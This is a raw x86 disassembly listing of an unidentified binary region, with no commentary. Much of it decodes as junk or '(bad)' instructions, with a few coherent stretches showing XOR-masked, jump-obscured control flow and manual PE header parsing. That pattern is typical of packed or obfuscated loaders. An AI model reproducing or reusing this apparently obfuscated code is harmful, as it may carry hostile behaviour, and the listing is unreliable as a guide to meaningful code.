  408d79:	mov    ds:0xc8c07ef5,eax
  408d7e:	imul   ebp,DWORD PTR [edi],0xf1350c1e
  408d84:	xor    DWORD PTR [eax+0x41565c58],ebp
  408d8a:	(bad)  
  408d8b:	mov    esi,DWORD PTR gs:[ecx+0x64013de7]
  408d92:	mov    bh,0x1b
  408d94:	push   ecx
  408d95:	std    
  408d96:	(bad)  
  408d97:	dec    ecx
  408d98:	outs   dx,DWORD PTR ds:[esi]
  408d99:	xor    esp,DWORD PTR [edx-0xd]
  408d9c:	popa   
  408d9d:	mov    BYTE PTR [ecx-0x28],ah
  408da0:	imul   edx,esp,0xffffff93
  408da3:	mov    eax,0xf0328425
  408da8:	lods   eax,DWORD PTR ds:[esi]
  408da9:	jg     0x408d9c
  408dab:	mov    bl,0x9c
  408dad:	test   al,0xac
  408daf:	imul   edx,DWORD PTR [esi-0x2a],0xffffffd0
  408db3:	shl    BYTE PTR [edx],1
  408db5:	xchg   DWORD PTR ds:0x2abe0a1d,ecx
  408dbb:	mov    eax,0x93613f28
  408dc0:	rol    DWORD PTR [ecx+0x5f],cl
  408dc3:	aam    0xa4
  408dc5:	push   edi
  408dc6:	ror    BYTE PTR [esi+0x6c],cl
  408dc9:	dec    edx
  408dca:	cmp    dh,BYTE PTR ds:[edi-0x796b3314]
  408dd1:	ficom  DWORD PTR [edi+0x5f8d53ad]
  408dd7:	adc    al,0x3
  408dd9:	jmp    0x408d81
  408ddb:	rcl    ecx,cl
  408ddd:	sbb    BYTE PTR [eax],bl
  408ddf:	xchg   dl,ch
  408de1:	nop
  408de2:	popf   
  408de3:	push   edx
  408de4:	retf   
  408de5:	mov    bh,0xce
  408de7:	mov    ds:0xcea724bd,eax
  408dec:	dec    eax
  408ded:	cs push edi
  408def:	xchg   edi,eax
  408df0:	xchg   edi,eax
  408df1:	popf   
  408df2:	mov    al,0x70
  408df4:	data16 (bad) 
  408df6:	retf   
  408df7:	adc    dh,BYTE PTR [edx+edx*4-0x52]
  408dfb:	inc    ecx
  408dfc:	pop    ss
  408dfd:	mov    esi,0x2302f5f7
  408e02:	xchg   cx,sp
  408e05:	or     cl,BYTE PTR [ebx]
  408e07:	push   ds
  408e08:	adc    eax,0x296ebee7
  408e0d:	pop    eax
  408e0e:	mov    edx,0xf1a97a8
  408e13:	jne    0x408e85
  408e15:	and    al,0x8e
  408e17:	fimul  WORD PTR [esp+edx*1-0xb]
  408e1b:	hlt    
  408e1c:	stc    
  408e1d:	retf   0x92
  408e20:	ins    BYTE PTR es:[edi],dx
  408e21:	shr    BYTE PTR [ebp+0x5a],1
  408e24:	ja     0x408dd3
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xc0b63ccd
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	test   eax,0x58867511
  408ec9:	or     eax,0xd5b727b6
  408ece:	outs   dx,DWORD PTR ds:[esi]
  408ecf:	and    eax,DWORD PTR [edi+0x50]
  408ed2:	pop    ecx
  408ed3:	mov    bl,BYTE PTR [ebp+edx*4+0x8]
  408ed7:	fsubr  DWORD PTR [ebx+ebp*4+0xb]
  408edb:	dec    edx
  408edc:	enter  0x1df,0x1d
  408ee0:	push   0xffffffbb
  408ee2:	dec    ebp
  408ee3:	mov    ecx,0xb5a8bc24
  408ee8:	push   ss
  408ee9:	out    dx,al
  408eea:	xchg   esp,eax
  408eeb:	pop    ds
  408eec:	fwait
  408eed:	xchg   esp,eax
  408eee:	jnp    0x408f35
  408ef0:	movnti DWORD PTR [ebx-0x5c],eax
  408ef4:	arpl   WORD PTR [ecx],bp
  408ef6:	inc    esi
  408ef7:	pushf  
  408ef8:	mov    ebp,0xd7bd6dc0
  408efd:	aam    0xc0
  408eff:	jg     0x408f13
  408f01:	xchg   esp,eax
  408f02:	add    bl,bl
  408f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f06:	inc    esi
  408f07:	iret   
  408f08:	xor    BYTE PTR [ebp-0x79],ch
  408f0b:	dec    eax
  408f0c:	xchg   ebp,eax
  408f0d:	(bad)  
  408f0e:	mov    dh,0xd0
  408f10:	push   es
  408f11:	pop    ss
  408f12:	shl    BYTE PTR [esp+edx*4+0x59],cl
  408f16:	xchg   DWORD PTR [edx],ebx
  408f18:	mov    al,ds:0xa21fee87
  408f1d:	lods   al,BYTE PTR ds:[esi]
  408f1e:	push   eax
  408f1f:	cdq    
  408f20:	(bad)  
  408f21:	ins    BYTE PTR es:[edi],dx
  408f22:	loop   0x408eaf
  408f24:	jle    0x408f25
  408f26:	js     0x408ebc
  408f28:	inc    esi
  408f29:	scas   al,BYTE PTR es:[edi]
  408f2a:	mov    eax,0xcf783d81
  408f2f:	inc    ecx
  408f30:	mov    bh,0xdd
  408f32:	test   DWORD PTR [ebp+0x1b],ebp
  408f35:	add    BYTE PTR [edi-0x75],0x18
  408f39:	pop    edx
  408f3a:	mov    ch,0xf5
  408f3c:	iret   
  408f3d:	jmp    0x408ec8
  408f3f:	and    eax,DWORD PTR [edi+0x77]
  408f42:	icebp  
  408f43:	push   cs
  408f44:	or     BYTE PTR [eax],cl
  408f46:	clc    
  408f47:	sub    al,0xa7
  408f49:	(bad)  
  408f4a:	adc    eax,0xad839337
  408f4f:	push   0xffffff9f
  408f51:	sbb    DWORD PTR [ecx-0x57],0x37c8e27f
  408f58:	dec    ebp
  408f59:	scas   al,BYTE PTR es:[edi]
  408f5a:	adc    eax,0x56305ac5
  408f5f:	cmp    edx,ecx
  408f61:	jge    0x408efa
  408f63:	in     al,dx
  408f64:	push   eax
  408f65:	out    0xce,al
  408f67:	lahf   
  408f68:	call   0x8dc8ea21
  408f6d:	shl    bl,cl
  408f6f:	xchg   ebp,eax
  408f70:	enter  0x957c,0xe1
  408f74:	adc    ebx,DWORD PTR [eax+0x2b]
  408f77:	outs   dx,BYTE PTR ds:[esi]
  408f79:	shl    eax,0x2d
  408f7c:	add    cl,0x79
  408f7f:	enter  0xdf07,0x1e
  408f83:	add    al,0xfa
  408f85:	add    esi,DWORD PTR [eax+0x5]
  408f88:	les    eax,FWORD PTR [edx+0x4d0b4910]
  408f8e:	mov    al,ds:0x6f97f84
  408f93:	(bad)  
  408f95:	out    0x5e,eax
  408f97:	clc    
  408f98:	loopne 0x408f7d
  408f9a:	bound  eax,QWORD PTR [edx]
  408f9c:	test   bl,0x34
  408f9f:	repnz sub eax,0xffe5de2e
  408fa5:	stc    
  408fa6:	xchg   ecx,eax
  408fa7:	in     al,dx
  408fa8:	lods   eax,DWORD PTR ds:[esi]
  408fa9:	pop    eax
  408faa:	xchg   edx,eax
  408fab:	mov    al,ds:0x8a934caa
  408fb0:	fsubp  st(7),st
  408fb2:	mov    ch,0xc1
  408fb4:	sub    bh,bh
  408fb6:	inc    edx
  408fb7:	sti    
  408fb8:	je     0x40901d
  408fba:	xchg   edx,eax
  408fbb:	mov    ebx,DWORD PTR [ebx+0x42]
  408fbe:	pop    esp
  408fbf:	adc    al,0xf7
  408fc1:	dec    esp
  408fc2:	ret    
  408fc3:	mov    ebp,0xff72548f
  408fc8:	push   edi
  408fc9:	push   esi
  408fca:	dec    BYTE PTR [eax]
  408fcc:	xor    BYTE PTR ds:0x83356640,dl
  408fd2:	mov    ah,0xd5
  408fd4:	rol    DWORD PTR [edx+0x7caac87d],0x76
  408fdb:	mov    edx,0x37be23a
  408fe0:	xor    esi,esp
  408fe2:	pop    esi
  408fe3:	shl    BYTE PTR [esi+0x3b015cdc],0x16
  408fea:	in     al,dx
  408feb:	and    eax,0xd0ab2a57
  408ff0:	xchg   ecx,eax
  408ff1:	xchg   BYTE PTR [edi],ah
  408ff3:	jp     0x40902e
  408ff5:	or     esi,DWORD PTR [edx]
  408ff7:	pop    ebx
  408ff8:	push   es
  408ff9:	adc    DWORD PTR [ecx+eax*2+0x3e],0xdccd644d
  409001:	leave  
  409002:	imul   ch
  409004:	mov    ?,WORD PTR [edi+0x7f84ffe1]
  40900a:	xor    DWORD PTR [ecx+0x2c],esi
  40900d:	inc    esi
  40900e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40900f:	mov    esp,0xd82d500e
  409014:	push   esi
  409015:	xor    al,0x65
  409017:	test   ebx,edx
  409019:	popf   
  40901a:	shl    edi,cl
  40901c:	sbb    edx,esi
  40901e:	add    BYTE PTR [esp+ecx*8],cl
  409021:	loope  0x40900f
  409023:	lods   al,BYTE PTR ds:[esi]
  409024:	pop    edi
  409025:	mov    esi,0x106e2de5
  40902a:	push   esp
  40902b:	scas   eax,DWORD PTR es:[edi]
  40902c:	jp     0x409083
  40902e:	aad    0xa4
  409030:	sub    eax,DWORD PTR [esi-0x1a224f1]
  409036:	loope  0x40902e
  409038:	mov    eax,0x2483c8
  40903d:	mov    ch,0x4a
  40903f:	pop    edi
  409040:	xor    edi,DWORD PTR [ecx-0x32]
  409043:	or     cl,BYTE PTR [ebp-0x670a246d]
  409049:	xchg   ebp,eax
  40904a:	retf   
  40904b:	pushf  
  40904c:	adc    eax,0xa40bdbd9
  409051:	test   eax,0x6b5d3a6
  409056:	shl    BYTE PTR [edi],cl
  409058:	fisubr WORD PTR [ebx-0x5574e9f]
  40905e:	das    
  40905f:	jp     0x2db3b6fa
  409065:	push   esi
  409066:	inc    ebx
  409067:	(bad)  
  409069:	retf   0x49f4
  40906c:	(bad)  
  40906d:	xor    DWORD PTR [esi],esp
  40906f:	xchg   ebp,eax
  409070:	add    bl,dl
  409072:	jl     0x40907c
  409074:	and    al,BYTE PTR [edx-0x2fae49b7]
  40907a:	push   es
  40907b:	dec    esi
  40907c:	retf   0xef13
  40907f:	dec    eax
  409080:	push   ss
  409081:	xchg   ebp,eax
  409082:	std    
  409083:	stos   BYTE PTR es:[edi],al
  409084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409085:	das    
  409086:	push   cs
  409087:	call   0xe467:0x657ca0f0
  40908e:	(bad)  
  40908f:	in     al,0xa6
  409091:	jmp    0x4ac84310
  409096:	cmp    DWORD PTR [esi+0x2f],edx
  409099:	fs enter 0xfd5c,0x59
  40909e:	pushf  
  40909f:	mov    es,WORD PTR [ebx+ebp*4]
  4090a2:	dec    ebp
  4090a3:	sub    eax,0x6523749f
  4090a8:	lock je 0x40905b
  4090ab:	push   ecx
  4090ac:	pop    ecx
  4090ad:	mov    BYTE PTR [ebx-0x73df4e81],al
  4090b3:	or     DWORD PTR [eax+ebx*2],ecx
  4090b6:	sub    DWORD PTR [ebx-0x53],ecx
  4090b9:	imul   eax,DWORD PTR [edx],0x207bb42
  4090bf:	push   es
  4090c0:	sub    eax,0x80f99b65
  4090c5:	lds    ebp,FWORD PTR [eax-0x56]
  4090c8:	test   DWORD PTR [esi-0x1],ecx
  4090cb:	and    al,0x76
  4090cd:	xor    BYTE PTR [ecx-0x75],ah
  4090d0:	inc    edi
  4090d1:	stos   DWORD PTR es:[edi],eax
  4090d2:	dec    ebp
  4090d3:	hlt    
  4090d4:	or     eax,0x114f4fed
  4090d9:	mov    ebx,0xdbe97315
  4090de:	repnz adc cl,BYTE PTR [esi]
  4090e1:	jge    0x4090f0
  4090e3:	repz and dl,BYTE PTR [esi+ebx*2-0x9]
  4090e8:	push   ecx
  4090e9:	push   esp
  4090ea:	(bad)  
  4090eb:	xlat   BYTE PTR ds:[ebx]
  4090ec:	inc    esi
  4090ed:	mov    bh,0x33
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xa1
  409163:	inc    ebp
  409164:	pusha  
  409165:	fnsave [edx]
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	adc    ecx,edi
  409170:	and    al,0x47
  409172:	mov    esi,0xf26852d6
  409177:	push   eax
  409178:	(bad)  
  409179:	jnp    0x4091b6
  40917b:	popf   
  40917c:	push   eax
  40917d:	ins    BYTE PTR es:[edi],dx
  40917e:	jae    0x40910a
  409180:	fbld   TBYTE PTR [edx+0x3008506a]
  409186:	cmp    al,0x95
  409188:	sub    al,0x75
  40918a:	mov    eax,ds:0xe8646e30
  40918f:	ja     0x4091ae
  409191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409192:	not    DWORD PTR [ebx+0x39]
  409195:	mov    esp,0x4ea30875
  40919a:	cs std 
  40919c:	inc    esp
  40919d:	or     DWORD PTR [edi-0x5],ecx
  4091a0:	mov    edi,0x30e4daa1
  4091a5:	sbb    al,0xe7
  4091a7:	(bad)
  4091ab:	push   ebx
  4091ac:	(bad)  
  4091ad:	hlt    
  4091ae:	int3   
  4091af:	push   cs
  4091b0:	or     BYTE PTR [ebp+0x27c36564],ah
  4091b6:	dec    esp
  4091b7:	push   cs
  4091b8:	adc    eax,0x49f967ef
  4091bd:	jne    0x409170
  4091bf:	stos   BYTE PTR es:[edi],al
  4091c0:	push   ecx
  4091c1:	or     BYTE PTR [ebp-0x27],bl
  4091c4:	stos   BYTE PTR es:[edi],al
  4091c5:	sar    BYTE PTR [ebx+0x73],cl
  4091c8:	and    eax,ebx
  4091ca:	out    0xe4,eax
  4091cc:	clc    
  4091cd:	test   al,0x2e
  4091cf:	xor    BYTE PTR [ebx-0x292bcf9e],bl
  4091d5:	xchg   BYTE PTR [edi+0x0],al
  4091d8:	push   0x38
  4091da:	xor    al,0xd9
  4091dc:	xchg   ecx,eax
  4091dd:	(bad)  
  4091de:	fisub  WORD PTR [edi+0x29]
  4091e1:	retf   
  4091e2:	std    
  4091e3:	or     al,BYTE PTR [ecx-0xbe205aa]
  4091e9:	mov    bh,0x2f
  4091eb:	xchg   ecx,eax
  4091ec:	call   0xe788:0x2e5a567c
  4091f3:	xchg   DWORD PTR [ebp+0x46],edx
  4091f6:	icebp  
  4091f7:	imul   edx,DWORD PTR [edx],0xffffff94
  4091fa:	jo     0x4091c9
  4091fc:	test   eax,0x7ba9856e
  409201:	sbb    DWORD PTR [esi+0x58],esi
  409204:	jge    0x40921f
  409206:	aad    0xd4
  409208:	fs push ecx
  40920a:	mov    edi,0xae66ff55
  40920f:	sub    al,0x83
  409211:	xchg   ecx,eax
  409212:	or     DWORD PTR [edx],ecx
  409214:	loopne 0x409277
  409216:	test   al,0x95
  409218:	pop    eax
  409219:	push   ebp
  40921a:	cmp    BYTE PTR [ebx-0x677cbc15],dl
  409220:	or     BYTE PTR [bp+di],0xb3
  409224:	mov    DWORD PTR [edi+0x54],edx
  409227:	pop    esi
  409228:	test   esp,ecx
  40922a:	ins    BYTE PTR es:[edi],dx
  40922b:	mov    edi,0xfd2c0133
  409230:	(bad)  
  409231:	in     al,dx
  409232:	shr    BYTE PTR [esi+0x25],0xe9
  409236:	or     al,0xdd
  409238:	aam    0xd9
  40923a:	pop    edx
  40923b:	sub    DWORD PTR [edx+0x55e3d93f],esi
  409241:	jmp    0x409219
  409243:	ins    DWORD PTR es:[edi],dx
  409244:	and    bl,dl
  409246:	aas    
  409247:	idiv   BYTE PTR [ebx]
  409249:	xchg   edx,ebx
  40924b:	sub    dh,BYTE PTR [ebp-0x37870e52]
  409251:	pushf  
  409252:	test   eax,0x788fbe51
  409257:	or     ch,dl
  409259:	mov    bh,0x12
  40925b:	jo     0x4091fd
  40925d:	popa   
  40925e:	aad    0xb3
  409260:	cdq    
  409261:	inc    esi
  409262:	xor    cl,bl
  409264:	enter  0x794b,0x34
  409268:	mov    esi,ebp
  40926a:	sti    
  40926b:	xchg   ebx,eax
  40926c:	mov    eax,0x960d0f92
  409271:	inc    eax
  409272:	adc    ecx,DWORD PTR [esi-0xa]
  409275:	push   edi
  409276:	in     eax,0xe6
  409278:	mov    ah,0x29
  40927a:	and    ecx,edi
  40927c:	lock xchg dl,dh
  40927f:	jecxz  0x409293
  409281:	dec    edi
  409282:	mov    al,0x5e
  409284:	test   DWORD PTR [ebp+0x6a],ecx
  409287:	jne    0x409230
  409289:	(bad)  
  40928b:	js     0x409291
  40928d:	mov    al,ds:0xb741e28b
  409292:	outs   dx,DWORD PTR ds:[esi]
  409293:	pushf  
  409294:	in     al,dx
  409295:	jno    0x4092ca
  409297:	sub    edx,DWORD PTR [edx-0x2e]
  40929a:	loop   0x4092c0
  40929c:	(bad)  
  40929e:	(bad)
  4092a1:	imul   ebx,esp,0xe8cd7f47
  4092a7:	mov    al,ds:0x52669de3
  4092ac:	imul   ecx,DWORD PTR [ecx+edx*8],0x8d4a68e3
  4092b3:	mov    dh,0x62
  4092b5:	mov    bl,0xc3
  4092b7:	xchg   ecx,eax
  4092b8:	out    dx,eax
  4092b9:	mov    esp,0xfbc80814
  4092be:	stos   BYTE PTR es:[edi],al
  4092bf:	ret    0x210b
  4092c2:	add    BYTE PTR [esi],0x1b
  4092c5:	stos   BYTE PTR es:[edi],al
  4092c6:	in     al,dx
  4092c7:	push   0xa0f5f3ab
  4092cc:	adc    bh,BYTE PTR [edx-0x7efb40ab]
  4092d2:	add    ch,dh
  4092d4:	test   eax,0xa311bd8
  4092d9:	xchg   DWORD PTR [eax],edx
  4092db:	ror    DWORD PTR [ebx+0x47],cl
  4092de:	repnz sahf 
  4092e0:	pop    ebx
  4092e1:	lahf   
  4092e2:	adc    eax,0xa4c949e
  4092e7:	into   
  4092e8:	shl    BYTE PTR [edx+0x55c1a4b3],cl
  4092ee:	xchg   edx,eax
  4092ef:	mov    esp,esp
  4092f1:	xor    esi,DWORD PTR ds:0x22d9cb6d
  4092f7:	sti    
  4092f8:	dec    edi
  4092f9:	mov    WORD PTR [edx],?
  4092fb:	mov    ds:0xf815f8bb,eax
  409300:	lods   eax,DWORD PTR ds:[esi]
  409301:	xchg   esi,eax
  409302:	pop    DWORD PTR [ebp-0x4b558e47]
  409308:	dec    esp
  409309:	clc    
  40930a:	loope  0x409342
  40930c:	adc    DWORD PTR [edi+0x47b80d00],ebp
  409312:	inc    ebx
  409313:	mov    bl,0x85
  409315:	ins    BYTE PTR es:[edi],dx
  409316:	mov    dh,0x66
  409318:	ss (bad) 
  40931a:	adc    DWORD PTR [ebp*2-0x1863f5f6],0xc07d2f63
  409325:	push   cs
  409326:	fs mov cl,0x6c
  409329:	mov    ah,0x21
  40932b:	xor    eax,0xc9ce1d68
  409330:	aam    0x25
  409332:	in     al,0x1b
  409334:	lods   al,BYTE PTR ds:[esi]
  409335:	repz mov ecx,0xaa5d293a
  40933b:	adc    bh,BYTE PTR [esi-0x3d96cd]
  409341:	pushf  
  409342:	push   es
  409343:	jnp    0x13bfa56a
  409349:	cli    
  40934a:	popf   
  40934b:	mov    ch,0x1
  40934d:	xchg   ebp,eax
  40934e:	mov    esp,0x1ee771c2
  409353:	loope  0x409363
  409355:	mov    dh,BYTE PTR [ebx+0x5c84717a]
  40935b:	pop    esi
  40935c:	adc    DWORD PTR [edx+0x66],edi
  40935f:	sbb    ecx,ebp
  409361:	jno    0x409394
  409363:	in     al,dx
  409364:	pop    ss
  409365:	pop    esi
  409366:	push   ebp
  409367:	ret    
  409368:	pop    edi
  409369:	hlt    
  40936a:	cmp    ebp,DWORD PTR [ebx+edi*1]
  40936d:	lock or DWORD PTR [ecx+0x28],ecx
  409371:	adc    DWORD PTR [ebp+0x48],ecx
  409374:	inc    ebp
  409375:	push   ds
  409376:	push   es
  409377:	das    
  409378:	clc    
  409379:	pop    ds
  40937a:	mov    WORD PTR [edi+0x668ff522],fs
  409380:	aad    0x30
  409382:	enter  0x8b8d,0xb5
  409386:	test   BYTE PTR [edi+ebx*4+0x4d],ch
  40938a:	in     eax,0x28
  40938c:	jne    0x40936d
  40938e:	add    BYTE PTR ds:0xf2ec309d,dl
  409394:	lods   al,BYTE PTR ds:[esi]
  409395:	pop    ecx
  409396:	call   ebp
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	test   bh,ah
  4093b6:	fninit 
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	cmp    BYTE PTR [edx+0x5c],0x1f
  4093c4:	popa   
  4093c5:	push   es
  4093c6:	push   0x458a2ea6
  4093cb:	mov    edx,0x796bcd0a
  4093d0:	int    0x31
  4093d2:	jg     0x4093dc
  4093d4:	add    edx,0xb0c98017
  4093da:	shl    al,1
  4093dc:	sbb    DWORD PTR [eax-0x39],eax
  4093df:	inc    eax
  4093e0:	je     0x409367
  4093e2:	push   0xf
  4093e4:	test   al,0x5c
  4093e6:	stos   BYTE PTR es:[edi],al
  4093e7:	lahf   
  4093e8:	push   eax
  4093e9:	ja     0x409417
  4093eb:	adc    bh,bh
  4093ed:	retf   
  4093ee:	adc    edi,DWORD PTR [edi-0x7f]
  4093f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093f2:	inc    edi
  4093f3:	pop    edx
  4093f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093f5:	leave  
  4093f6:	xchg   esp,eax
  4093f7:	adc    eax,0xa6a7b14c
  4093fc:	xchg   esi,eax
  4093fd:	and    BYTE PTR [esi],0xc
  409400:	add    BYTE PTR fs:[esp+edi*1-0x21fc6281],dh
  409408:	mov    ds:0x2614c3d2,al
  40940d:	sub    ch,BYTE PTR [esi-0x74]
  409410:	enter  0xde51,0x70
  409414:	cwde   
  409415:	psllw  mm1,QWORD PTR [esi-0x10]
  409419:	xchg   edi,eax
  40941a:	jecxz  0x4093ea
  40941c:	push   ebp
  40941d:	jne    0x409405
  40941f:	mov    edx,0x75f1cc81
  409424:	jmp    0x7b2b:0x52be25e5
  40942b:	xor    al,0x66
  40942d:	adc    BYTE PTR [edx+ebp*4-0x18],dh
  409431:	mov    al,ds:0xf5d1f5b7
  409436:	leave  
  409437:	and    BYTE PTR [ebp-0x142898af],dl
  40943d:	cmp    eax,0x3c3c48f8
  409442:	push   edi
  409443:	in     al,0xc5
  409445:	push   es
  409446:	mov    esp,0x665c4b8e
  40944b:	adc    esp,DWORD PTR [ebx-0x527f32e6]
  409451:	xchg   esi,eax
  409452:	lods   al,BYTE PTR ds:[esi]
  409453:	scas   al,BYTE PTR es:[edi]
  409454:	push   ss
  409455:	sti    
  409456:	adc    DWORD PTR [ebx+0x7473375f],ebp
  40945c:	mov    esi,0xb35ee49d
  409461:	fst    st(0)
  409463:	mov    esp,0xc4488905
  409468:	call   0x63b5:0x32b74401
  40946f:	push   ebx
  409470:	pop    edi
  409471:	mov    ebx,0x34ad8635
  409476:	xor    cl,BYTE PTR [esi-0x49]
  409479:	sbb    eax,0x153d0b90
  40947e:	je     0x40945d
  409480:	fidivr WORD PTR [eax+edi*8+0x31612372]
  409487:	shl    DWORD PTR [ebp+ebp*1-0x35034b5c],cl
  40948e:	outs   dx,BYTE PTR ds:[esi]
  40948f:	xlat   BYTE PTR ds:[ebx]
  409490:	mov    bh,0xb5
  409492:	cmp    BYTE PTR [esi+0x30],dh
  409495:	push   ss
  409496:	or     eax,0x8c6567d1
  40949b:	xchg   ecx,eax
  40949c:	inc    esi
  40949d:	pusha  
  40949e:	es mov dh,0xcb
  4094a1:	fld    TBYTE PTR [esi]
  4094a3:	pusha  
  4094a4:	mov    dh,0xe3
  4094a6:	adc    ebp,DWORD PTR [esi+eiz*2+0x16]
  4094aa:	ret    0x9675
  4094ad:	mov    ds,WORD PTR [ebp-0x18]
  4094b0:	xchg   esp,eax
  4094b1:	leave  
  4094b2:	xor    ch,BYTE PTR [ebx-0x68]
  4094b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094b6:	jp     0x4094c9
  4094b8:	dec    edx
  4094b9:	sub    esi,DWORD PTR [edi+0x1bac6b19]
  4094bf:	and    al,0x13
  4094c1:	loope  0x4094f1
  4094c3:	mov    cl,cl
  4094c5:	xchg   ebp,eax
  4094c6:	(bad)  
  4094c7:	loope  0x40951e
  4094c9:	lea    edi,[ecx+0x587ba332]
  4094cf:	mov    bh,0xe3
  4094d1:	pop    esi
  4094d2:	bsf    eax,DWORD PTR [edx-0x4c]
  4094d6:	fucomp st(7)
  4094d8:	or     DWORD PTR [ecx-0x271e7d6e],edi
  4094de:	js     0x4094fe
  4094e0:	and    bh,ch
  4094e2:	mov    bl,0x40
  4094e4:	xor    DWORD PTR [ecx],ebx
  4094e6:	mov    ch,0xd9
  4094e8:	imul   edx,edx,0xffffffbd
  4094eb:	test   BYTE PTR [eax-0x79],0x66
  4094ef:	adc    DWORD PTR [eax-0x2b8b6c20],edx
  4094f5:	fwait
  4094f6:	retf   
  4094f7:	enter  0x77ea,0xdd
  4094fb:	add    eax,0xd8bae8d2
  409500:	fdiv   DWORD PTR [eax-0x2349e5c7]
  409506:	mov    dl,0xfe
  409508:	bnd ja 0x4094f8
  40950b:	sub    eax,0xdcb0b26d
  409510:	sbb    eax,0xcc88ca72
  409515:	dec    esi
  409516:	out    0xb8,eax
  409518:	sbb    BYTE PTR [esi],bl
  40951a:	jge    0x409596
  40951c:	jns    0x4094a4
  40951e:	jle    0x4094ff
  409520:	cmp    ecx,0xffffffe0
  409523:	adc    eax,0x19669085
  409528:	iret   
  409529:	or     dh,bl
  40952b:	mov    DWORD PTR [edx],edx
  40952d:	jbe    0x4094f1
  40952f:	test   BYTE PTR [ebp+0x36658c93],al
  409535:	push   ebp
  409536:	jne    0x409563
  409538:	(bad)  
  409539:	data16 cmp cl,BYTE PTR [ebx]
  40953c:	jo     0x409591
  40953e:	std    
  40953f:	out    0x75,eax
  409541:	push   0x62115ab0
  409546:	jge    0x4095ab
  409548:	pop    esi
  409549:	push   es
  40954a:	enter  0xba0,0x5d
  40954e:	inc    esp
  40954f:	mov    BYTE PTR [edi],al
  409551:	pop    esi
  409552:	pop    es
  409553:	cld    
